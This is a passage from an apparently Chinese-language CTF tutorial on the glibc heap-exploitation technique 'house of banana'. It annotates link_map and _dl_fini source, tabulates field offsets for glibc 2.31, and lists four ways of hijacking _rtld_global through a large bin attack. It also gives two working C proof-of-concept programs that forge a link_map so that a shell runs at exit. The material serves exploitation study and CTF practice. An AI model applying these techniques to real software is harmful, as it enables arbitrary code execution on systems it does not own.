class="params">(Phdr)</span> *l_phdr;	<span class="comment">/* Pointer to program header table in core.  */</span></span><br><span class="line">    ElfW(Addr) l_entry;		<span class="comment">/* Entry point location.  */</span></span><br><span class="line">    ElfW(Half) l_phnum;		<span class="comment">/* Number of program header entries.  */</span></span><br><span class="line">    ElfW(Half) l_ldnum;		<span class="comment">/* Number of dynamic segment entries.  */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> <span class="title">l_searchlist</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* We need a special searchlist to process objects marked with</span></span><br><span class="line"><span class="comment">       DT_SYMBOLIC.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> <span class="title">l_symbolic_searchlist</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Dependent object that first caused this object to be loaded.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_loader</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Array with version names.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">l_versions</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_nversions;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Symbol hash table.  */</span></span><br><span class="line">    Elf_Symndx l_nbuckets;</span><br><span class="line">    Elf32_Word l_gnu_bitmask_idxbits;</span><br><span class="line">    Elf32_Word l_gnu_shift;</span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Addr)</span> *l_gnu_bitmask;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="type">const</span> Elf32_Word *l_gnu_buckets;</span><br><span class="line">      <span class="type">const</span> Elf_Symndx *l_chain;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="type">const</span> Elf32_Word *l_gnu_chain_zero;</span><br><span class="line">      <span class="type">const</span> Elf_Symndx *l_buckets;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_direct_opencount; <span class="comment">/* Reference count for dlopen/dlclose.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span>			/* <span class="title">Where</span> <span class="title">this</span> <span class="title">object</span> <span class="title">came</span> <span class="title">from</span>.  */</span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line">	lt_executable,		<span class="comment">/* The main executable program.  */</span></span><br><span class="line">	lt_library,		<span class="comment">/* Library needed by main executable.  */</span></span><br><span class="line">	lt_loaded		<span class="comment">/* Extra run-time loaded shared object.  */</span></span><br><span class="line">      &#125; l_type:<span class="number">2</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_relocated:<span class="number">1</span>;	<span class="comment">/* Nonzero if object&#x27;s relocations done.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_init_called:<span class="number">1</span>; <span class="comment">/* Nonzero if DT_INIT function called.  */</span></span><br><span class="line">    ............以下还有不少,在这里不是很重要</span><br><span class="line">   <span class="comment">//在 C 语言中，变量声明后加:1 表示该变量是一个位域（bit-field）。位域允许将一个整数类型的数据分割为多个较小的位字段，以便更有效地使用内存。&quot;:1&quot; 表示该位域的宽度为 1 位。这意味着该变量只能存储一个位的值，即 0 或 1。</span></span><br><span class="line">        <span class="comment">//l_init_called变量在这里是第四个位域</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ptype Elf64_Dyn</span><br><span class="line">type = <span class="keyword">struct</span> &#123;</span><br><span class="line">    Elf64_Sxword d_tag;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        Elf64_Xword d_val;<span class="comment">//union结构体只取其一</span></span><br><span class="line">        Elf64_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<p>这些个结构体在退出时会被dl_fini调用[glibc/elf/dl_fini.c]</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_dl_fini (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="type">int</span> do_audit = <span class="number">0</span>;</span><br><span class="line"> again:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">for</span> (Lmid_t ns = GL(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns)</span><br><span class="line">      <span class="comment">//大多数时候dl_nns都是1,也就是这个循环只执行一次,ns==0</span></span><br><span class="line">    &#123;</span><br><span class="line">      __rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> nloaded = GL(dl_ns)[ns]._ns_nloaded;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (nloaded == <span class="number">0</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">	  || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	  )</span><br><span class="line">	__rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">          <span class="comment">//nloaded通常为4</span></span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">struct</span> link_map *maps[nloaded];</span><br><span class="line"></span><br><span class="line">	  <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">	  <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">	  assert (nloaded != <span class="number">0</span> || GL(dl_ns)[ns]._ns_loaded == <span class="literal">NULL</span>);</span><br><span class="line">	  <span class="keyword">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = <span class="number">0</span>; l != <span class="literal">NULL</span>; l = l-&gt;l_next)</span><br><span class="line">	</span><br><span class="line">	    <span class="keyword">if</span> (l == l-&gt;l_real)</span><br><span class="line">	      &#123;</span><br><span class="line">		assert (i &lt; nloaded);</span><br><span class="line"></span><br><span class="line">		maps[i] = l;</span><br><span class="line">		l-&gt;l_idx = i;</span><br><span class="line">		++i;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">		++l-&gt;l_direct_opencount;</span><br><span class="line">	      &#125;</span><br><span class="line">	  assert (ns != LM_ID_BASE || i == nloaded);</span><br><span class="line">          <span class="comment">//因为ns==0,所以必须i==4,也就是上面的循环要执行四次</span></span><br><span class="line">	  assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="number">1</span>);</span><br><span class="line">	  <span class="type">unsigned</span> <span class="type">int</span> nmaps = i;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	  _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),</span><br><span class="line">			 <span class="literal">NULL</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	  __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span> =</span> maps[i];</span><br><span class="line"></span><br><span class="line">	      <span class="keyword">if</span> (l-&gt;l_init_called)<span class="comment">//l-&gt;l_init_called字段需要大于0</span></span><br><span class="line">		&#123;</span><br><span class="line">		</span><br><span class="line">		  l-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		</span><br><span class="line">		  <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span></span><br><span class="line">		      || (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>))</span><br><span class="line">		    &#123;</span><br><span class="line">	</span><br><span class="line">		      <span class="keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask)</span><br><span class="line">					    &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">			_dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,</span><br><span class="line">					  DSO_FILENAME (l-&gt;l_name),</span><br><span class="line">					  ns);</span><br><span class="line"></span><br><span class="line">		 </span><br><span class="line">		      <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">			&#123;</span><br><span class="line">			  ElfW(Addr) *<span class="built_in">array</span> =</span><br><span class="line">			    (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">					    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">			  <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">					    / <span class="keyword">sizeof</span> (ElfW(Addr)));<span class="comment">//sizeof==8</span></span><br><span class="line">			  <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)<span class="comment">//i最少要为1</span></span><br><span class="line">			    ((<span class="type">fini_t</span>) <span class="built_in">array</span>[i]) ();<span class="comment">//!!注意此时的i已经--了</span></span><br><span class="line">			&#125;</span><br><span class="line">              </span><br><span class="line">              </span><br><span class="line">              </span><br><span class="line">              </span><br><span class="line">----------------------------------------------------------------------------------------</span><br><span class="line">    <span class="comment">//后半部分在2.37以后由一个函数实现,不过实现逻辑并未改变,不影响该利用方法</span></span><br><span class="line">    <span class="type">void</span></span><br><span class="line">_dl_call_fini (<span class="type">void</span> *closure_map)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span> =</span> closure_map;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* When debugging print a message first.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_debug_mask) &amp; DL_DEBUG_IMPCALLS))</span><br><span class="line">    _dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>, <span class="built_in">map</span>-&gt;l_name, <span class="built_in">map</span>-&gt;l_ns);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Make sure nothing happens if we are called twice.  */</span></span><br><span class="line">  <span class="built_in">map</span>-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  ElfW(Dyn) *fini_array = <span class="built_in">map</span>-&gt;l_info[DT_FINI_ARRAY];</span><br><span class="line">  <span class="keyword">if</span> (fini_array != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ElfW(Addr) *<span class="built_in">array</span> = (ElfW(Addr) *) (<span class="built_in">map</span>-&gt;l_addr</span><br><span class="line">                                          + fini_array-&gt;d_un.d_ptr);</span><br><span class="line">      <span class="type">size_t</span> sz = (<span class="built_in">map</span>-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">                   / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line"></span><br><span class="line">      <span class="keyword">while</span> (sz-- &gt; <span class="number">0</span>)</span><br><span class="line">        ((<span class="type">fini_t</span>) <span class="built_in">array</span>[sz]) ();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>函数只截取到最终利用的地方<code>((fini_t) array[i]) ();</code></p>
<p>因此，可以利用large bin attack劫持rtld_global的_ns_loaded指针(指向link_map,和动态链接中使用的link_map是同一个),使其指向一片可控的区域(例如堆)，</p>
<p>并事先在可控区域里伪造好link_map结构体，这样程序exit或者正常退出main函数时，便会执行到伪造的fini_array数组。</p>
<p>此外最终执行的<code>array[i]) ()</code>其在一个while循环中，所以只要把i构造恰当，那么就可完成些不太严谨的ROP。</p>
<p>偏移表(2.31)不同libc版本会有差异</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>偏移</th>
<th>字段</th>
</tr>
</thead>
<tbody>
<tr>
<td>+0</td>
<td>l_addr</td>
</tr>
<tr>
<td>+0x18</td>
<td>l_next</td>
</tr>
<tr>
<td>+0x28</td>
<td>l_real</td>
</tr>
<tr>
<td>+0x110</td>
<td>l_info[DT_FINI_ARRAY]</td>
</tr>
<tr>
<td>+0x120</td>
<td>l_info[DT_FINI_ARRAYSZ]</td>
</tr>
<tr>
<td>+0x31c位域倒数第四位</td>
<td>l_init_called</td>
</tr>
</tbody>
</table>
</div>
<p>有四个思路</p>
<ul>
<li>思路1:直接劫持(_rtld_global._dl_ns[0]._ns_loaded)，布局好其他内容，使其调用到 fini_array</li>
<li>思路2:伪造(_rtld_global._dl_ns[0]._ns_loaded) 的 第三个next 指针，布局好其他内容，使其调用到 fini_array</li>
<li>思路3:直接劫持(_rtld_global._dl_ns[0]._ns_loaded)-&gt;l_info[26&amp;&amp;28],l_info[26]控制d_ptr,l_info[28]的d_val字段得大于8(实际上是不可控的size字段,必然满足条件),且d_ptr受到d_val和l_addr影响</li>
<li>思路4:修改 link_map-&gt;l_addr，根据偏移使其调用到指定区域的函数,可行性不大,因为largebin_attack只能够使l_addr修改为堆地址,<strong>除非在某些特殊情况能够做到任意写l_addr</strong></li>
</ul>
<h2 id="示例-4"><a href="#示例-4" class="headerlink" title="示例"></a>示例</h2><p>需要根据环境需要修改偏移，在有些情况下，rtld_global_ptr与libc_base的偏移在本地与远程并不是固定的，可能会在地址的第2字节处发生变化，因此可以爆破256种可能得到远程环境的精确偏移。</p>
<h3 id="思路1-poc"><a href="#思路1-poc" class="headerlink" title="思路1-poc:"></a>思路1-poc:</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">backdoor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;you hacked me!!&quot;</span>);</span><br><span class="line">   <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;house of banana&#x27;s poc&quot;</span>);</span><br><span class="line">   <span class="type">size_t</span> libc_base = &amp;puts - <span class="number">0x84420</span>;</span><br><span class="line">   <span class="type">size_t</span> _rtld_global_ptr_addr = libc_base + <span class="number">0x23a060</span>;</span><br><span class="line">   <span class="type">char</span> *ptr0 = <span class="built_in">malloc</span>(<span class="number">0x450</span>);</span><br><span class="line">   <span class="type">char</span> *gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">   <span class="type">char</span> *ptr1 = <span class="built_in">malloc</span>(<span class="number">0x440</span>);</span><br><span class="line">   gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">   <span class="type">char</span> *ptr2 = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line">   gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">   <span class="built_in">free</span>(ptr0);</span><br><span class="line">   <span class="comment">//put ptr9 into large bin</span></span><br><span class="line">   <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">   <span class="built_in">free</span>(ptr1); <span class="comment">//free ptr1 into unsorted bin</span></span><br><span class="line">   <span class="built_in">free</span>(ptr2); <span class="comment">//free ptr2 into unsorted bin</span></span><br><span class="line">   <span class="comment">//bk_nextsize = _rtld_global_ptr_addr</span></span><br><span class="line">   *(<span class="type">size_t</span> *)(ptr0 + <span class="number">0x18</span>) = _rtld_global_ptr_addr - <span class="number">0x20</span>;</span><br><span class="line">   <span class="built_in">malloc</span>(<span class="number">0x410</span>); <span class="comment">//large bin attack to  hijack _rtld_global_ptr</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">//fake a _rtld_global</span></span><br><span class="line">   <span class="type">size_t</span> fake_rtld_global_addr = ptr1 - <span class="number">0x10</span>;</span><br><span class="line">   <span class="type">size_t</span> *fake_rtld_global = (<span class="type">size_t</span> *)ptr1;</span><br><span class="line">   <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">   <span class="comment">//the chain&#x27;s length must &gt;= 4</span></span><br><span class="line">   fake_rtld_global[<span class="number">1</span>] = &amp;fake_rtld_global[<span class="number">2</span>];<span class="comment">//l_next</span></span><br><span class="line">   fake_rtld_global[<span class="number">3</span>] = fake_rtld_global_addr;<span class="comment">//l_real</span></span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">   fake_rtld_global[<span class="number">2</span>+<span class="number">3</span>] = &amp;fake_rtld_global[<span class="number">3</span>];</span><br><span class="line">   fake_rtld_global[<span class="number">2</span>+<span class="number">5</span>] = &amp;fake_rtld_global[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">   fake_rtld_global[<span class="number">3</span>+<span class="number">3</span>] = &amp;fake_rtld_global[<span class="number">8</span>];</span><br><span class="line">   fake_rtld_global[<span class="number">3</span>+<span class="number">5</span>] = &amp;fake_rtld_global[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">   fake_rtld_global[<span class="number">8</span>+<span class="number">3</span>] = <span class="number">0</span>;                    <span class="comment">//这一块都是在伪造next的接下来三次遍历</span></span><br><span class="line">   fake_rtld_global[<span class="number">8</span>+<span class="number">5</span>] = &amp;fake_rtld_global[<span class="number">8</span>];<span class="comment">//为什么不指向自己绕过,因为退出的条件时l==NULL</span></span><br><span class="line">												<span class="comment">//如果指向自己那就永远无法退出了</span></span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">   <span class="comment">//fake a fini_array segment</span></span><br><span class="line">   fake_rtld_global[<span class="number">0x20</span>] = &amp;fake_rtld_global[<span class="number">0x30</span>];</span><br><span class="line">   fake_rtld_global[<span class="number">0x22</span>] = &amp;fake_rtld_global[<span class="number">0x23</span>];</span><br><span class="line">   fake_rtld_global[<span class="number">0x23</span>+<span class="number">1</span>] = <span class="number">0x8</span>; <span class="comment">//func ptrs total len</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   fake_rtld_global[<span class="number">0x30</span>] = <span class="number">0x1A</span>;</span><br><span class="line">   fake_rtld_global[<span class="number">0x31</span>] = <span class="number">0</span>;</span><br><span class="line">   fake_rtld_global[<span class="number">-2</span>] = &amp;fake_rtld_global[<span class="number">0x32</span>];</span><br><span class="line"></span><br><span class="line">   <span class="comment">//funcs</span></span><br><span class="line">   fake_rtld_global[<span class="number">0x32</span>] = backdoor;</span><br><span class="line"><span class="comment">//布置l_info[26]和l_info[28]指向的Elf64_Dyn结构体</span></span><br><span class="line"></span><br><span class="line">   fake_rtld_global[<span class="number">0x61</span>] = <span class="number">0x800000000</span>;<span class="comment">//l_init_call,为什么这样设置参考上面的位域声明</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="思路2-poc"><a href="#思路2-poc" class="headerlink" title="思路2-poc:"></a>思路2-poc:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">getLibcBase</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint64_t</span> to;</span><br><span class="line">	<span class="type">uint64_t</span> from;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">0x400</span>];</span><br><span class="line">	</span><br><span class="line">	FILE* file;</span><br><span class="line">	<span class="built_in">sprintf</span>(buf, <span class="string">&quot;/proc/%d/maps&quot;</span>,(<span class="type">int</span>)getpid()); </span><br><span class="line">	file = fopen(buf, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">	<span class="keyword">while</span>(fgets(buf, <span class="keyword">sizeof</span>(buf), file)) </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;libc&quot;</span>)!=<span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">		    <span class="built_in">sscanf</span>(buf, <span class="string">&quot;%lx-%lx&quot;</span>, &amp;from, &amp;to);</span><br><span class="line">		    fclose(file);</span><br><span class="line">			<span class="keyword">return</span> from;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint64_t</span> libcBase    = getLibcBase();</span><br><span class="line">	<span class="type">uint64_t</span> rtld_global = libcBase+<span class="number">0x23a060</span>;</span><br><span class="line">	<span class="type">uint64_t</span>* next_node = (<span class="type">uint64_t</span>*)(rtld_global<span class="number">-0x48048</span>);	 </span><br><span class="line">    <span class="comment">// distance &amp;_rtld_global &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next)</span></span><br><span class="line">	<span class="type">uint64_t</span> fake = (<span class="type">uint64_t</span>)<span class="built_in">malloc</span>(<span class="number">0x470</span>);</span><br><span class="line">	<span class="built_in">memset</span>((<span class="type">void</span>*)fake,<span class="number">0</span>,<span class="number">0x470</span>);</span><br><span class="line">	</span><br><span class="line">	*next_node = fake;</span><br><span class="line">    <span class="comment">//l_addr==0</span></span><br><span class="line">	*(<span class="type">uint64_t</span>*)(fake+<span class="number">0x28</span>)  = fake;<span class="comment">//l_real</span></span><br><span class="line"></span><br><span class="line">	*(<span class="type">uint64_t</span>*)(fake+<span class="number">0x31c</span>) = <span class="number">0x1c</span>;<span class="comment">//l_init_called</span></span><br><span class="line">	</span><br><span class="line">    *(<span class="type">uint64_t</span>*)(fake+<span class="number">0x110</span>) = fake+<span class="number">0x40</span>;<span class="comment">//l_info[26]</span></span><br><span class="line">	*(<span class="type">uint64_t</span>*)(fake+<span class="number">0x48</span>)  = fake+<span class="number">0x58</span>;</span><br><span class="line">	*(<span class="type">uint64_t</span>*)(fake+<span class="number">0x58</span>)  = (<span class="type">uint64_t</span>)shell;</span><br><span class="line"></span><br><span class="line">	*(<span class="type">uint64_t</span>*)(fake+<span class="number">0x120</span>) = fake+<span class="number">0x48</span>;<span class="comment">//l_info[28]</span></span><br><span class="line">	*(<span class="type">uint64_t</span>*)(fake+<span class="number">0x50</span>)  = <span class="number">0x8</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="例题-4"><a href="#例题-4" class="headerlink" title="例题"></a>例题</h2><p><strong>西湖论剑2020决赛-husk</strong></p>
<h1 id="house-of-emma"><a href="#house-of-emma" class="headerlink" title="house of emma"></a>house of emma</h1><h2 id="概要-12"><a href="#概要-12" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>在GLIBC2.34 版本中，本应在 CTF 的 PWN 题中常用 Hook — <strong>free_hook 、</strong> <strong>malloc_hook</strong> 被取消，同时有些题目的限制中，又无法构造出任意地址申请。</p>
